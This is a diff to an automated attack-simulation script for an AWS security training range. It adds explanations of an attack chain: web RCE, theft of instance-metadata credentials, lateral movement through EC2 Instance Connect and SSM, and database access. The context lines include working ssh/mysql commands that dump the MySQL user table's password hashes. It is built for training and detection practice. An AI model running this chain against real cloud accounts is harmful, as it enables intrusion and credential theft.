@@ -43,7 +43,7 @@ spin_start() {
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
 banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 1              ===" "${RESET}"
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 1               ===" "${RESET}"
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
   printf "  • Step 1. Exploitation of Web RCE, IMDS stealing on EC2a\n"
   printf "  • Step 2. Permission enumeration for stolen IMDS\n"
@@ -162,6 +162,20 @@ aws configure set region                us-east-1 --profile default --profile "$
 spin_stop
 printf "\n"
 read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We exploited a Remote Code Execution (RCE) vulnerability in the web application\n"
+printf "to access the AWS Instance Metadata Service (IMDS) at 169.254.169.254.\n\n"
+printf "From IMDS, we obtained temporary AWS credentials:\n"
+printf "  • ${MAGENTA}AccessKeyId${RESET}: Identifies the IAM role session\n"
+printf "  • ${MAGENTA}SecretAccessKey${RESET}: Used to sign API requests\n"
+printf "  • ${MAGENTA}SessionToken${RESET}: Required for temporary credentials\n\n"
+printf "These credentials inherit all permissions of the EC2 instance's IAM role.\n"
+printf "IMDSv2 requires a session token, but once obtained, credential theft is trivial.\n\n"
+
 #############################################
 # End of Step 1
 #############################################
@@ -211,6 +225,19 @@ try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFI
 
 printf "\n"
 read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We performed permission enumeration using the stolen IMDS credentials.\n\n"
+printf "The reconnaissance revealed:\n"
+printf "  • ${MAGENTA}EC2 DescribeInstances${RESET}: Shows other instances (StreamGoat-EC2b)\n"
+printf "  • ${MAGENTA}SSM permissions${RESET}: Enables lateral movement without SSH\n"
+printf "  • ${MAGENTA}EC2 Instance Connect${RESET}: Allows SSH key injection\n\n"
+printf "Each [OK] result represents an exploitable permission path.\n"
+printf "EC2b becomes our next target for lateral movement.\n\n"
+
 #############################################
 # End of Step 2
 #############################################
@@ -295,6 +322,18 @@ ssm_probe() {
 ssm_probe "$IID"
 printf "\n"
 read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We used two AWS-native lateral movement techniques:\n\n"
+printf "  • ${MAGENTA}EC2 Instance Connect${RESET}: Pushed SSH key to EC2b's authorized_keys\n"
+printf "    This grants SSH access without knowing existing credentials.\n\n"
+printf "  • ${MAGENTA}SSM SendCommand${RESET}: Executes commands via AWS APIs\n"
+printf "    Works even if port 22 is blocked (no direct network needed).\n\n"
+printf "We now have shell access to EC2b using EC2a's compromised credentials.\n\n"
+
 #############################################
 # End of Step 3
 #############################################
@@ -311,6 +350,21 @@ printf "Executing$YELLOW SELECT CURRENT_USER(), @@hostname, @@version;$RESET\n"
 ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -t -e \"SELECT CURRENT_USER(), @@hostname, @@version;\"'"
 printf "\n"
 read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We discovered database credentials stored in environment variables.\n"
+printf "This is a common misconfiguration — credentials in env vars are:\n\n"
+printf "  • Visible to any process running as the same user\n"
+printf "  • Logged in shell history and process listings\n"
+printf "  • Easily extracted via 'env' or 'printenv' commands\n\n"
+printf "Better alternatives for credential management in AWS:\n"
+printf "  • ${CYAN}Secrets Manager${RESET}: Centralized secret storage with IAM\n"
+printf "  • ${CYAN}RDS IAM Authentication${RESET}: No passwords required\n"
+printf "  • ${CYAN}Parameter Store${RESET}: SecureString parameters with KMS\n\n"
+
 #############################################
 # End of Step 4
 #############################################
@@ -321,4 +375,29 @@ printf "Executing$YELLOW SELECT User,plugin,authentication_string from user;$RES
 ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -D mysql -t -e \"SELECT User,plugin,authentication_string from user;\"'"
 printf "\n"
 rm -rf /tmp/streamgoat_eic_*
+
+################################################################################
+# Final Summary
+################################################################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"
+
+printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
+printf "  1. Exploited RCE vulnerability on EC2a web application\n"
+printf "  2. Harvested AWS credentials from Instance Metadata Service (IMDS)\n"
+printf "  3. Enumerated permissions for stolen credentials\n"
+printf "  4. Lateral movement to EC2b via EC2 Instance Connect\n"
+printf "  5. Extracted database credentials from environment variables\n"
+printf "  6. Connected to RDS and exfiltrated user data\n\n"
+
+printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
+printf "  • Full compromise of RDS MySQL database\n"
+printf "  • Lateral movement between EC2 instances via IAM abuse\n"
+printf "  • Credential theft from environment variables\n\n"
+
+printf "%s\n" "Defenders should monitor for:"
+printf "  • Unusual IMDS access patterns from EC2 instances\n"
+printf "  • SendSSHPublicKey API calls from unexpected sources\n"
+printf "  • SSM command executions to sensitive instances\n"
+printf "  • Database connections from unexpected source IPs\n\n"
+
 read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
